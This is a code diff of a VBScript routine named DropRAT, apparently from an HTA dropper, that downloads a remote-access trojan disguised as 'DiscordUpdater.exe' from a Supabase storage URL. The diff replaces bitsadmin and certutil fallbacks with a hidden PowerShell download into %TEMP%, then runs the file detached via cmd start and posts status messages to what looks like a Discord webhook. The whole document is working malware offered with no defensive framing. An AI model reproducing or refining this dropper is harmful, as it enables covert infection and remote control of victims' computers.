@@ -145,33 +145,25 @@ End Sub
 ' --- DropRAT ---
 Sub DropRAT()
     Dim temp: temp = sh.ExpandEnvironmentStrings("%TEMP%") & "\DiscordUpdater.exe"
-    
-    ' YOUR GITHUB LINK
-    Dim dl: dl = "https://github.com/huh71943-s/dicecheck.app/raw/refs/heads/main/DiscordUpdater.exe"
+    Dim dl: dl = "https://uqmzwiaidvfokyfxzolb.supabase.co/storage/v1/object/public/DiscordUpdater/DiscordUpdater.exe"
     
     If fso.FileExists(temp) Then fso.DeleteFile temp
 
     Call PostEmbed("📦 RAT Download", "Fetching payload...", 3447003)
 
-    ' 1. Try bitsadmin in the background
-    sh.Run "bitsadmin /transfer wd /download /priority high " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, False
-    Call SleepSeconds(5)
-
-    ' 2. Fallback to certutil
-    If Not fso.FileExists(temp) Then
-        sh.Run "certutil -urlcache -split -f " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, True
-    End If
+    ' Use PowerShell to download synchronously (doesn't hang like bitsadmin)
+    sh.Run "powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri '" & dl & "' -OutFile '" & temp & "'", 0, True
     
-    ' 3. Fallback to PowerShell
-    If Not fso.FileExists(temp) Then
-        sh.Run "powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri '" & dl & "' -OutFile '" & temp & "'", 0, True
-    End If
-    
-    ' 4. Run if downloaded
+    ' Run if downloaded
     If fso.FileExists(temp) Then
         Call PostEmbed("🚀 RAT Downloaded", "Size: " & CStr(fso.GetFile(temp).Size) & " bytes", 3447003)
+        
+        ' Set working directory to avoid PyInstaller crash
         sh.CurrentDirectory = sh.ExpandEnvironmentStrings("%TEMP%")
+        
+        ' Launch via cmd start to detach from HTA
         sh.Run "cmd.exe /c start """" """ & temp & """", 0, False
+        
         Call PostEmbed("✅ RAT", "Payload executed successfully", 65280)
     Else
         Call PostEmbed("⌛ RAT Error", "Download failed.", 16711680)
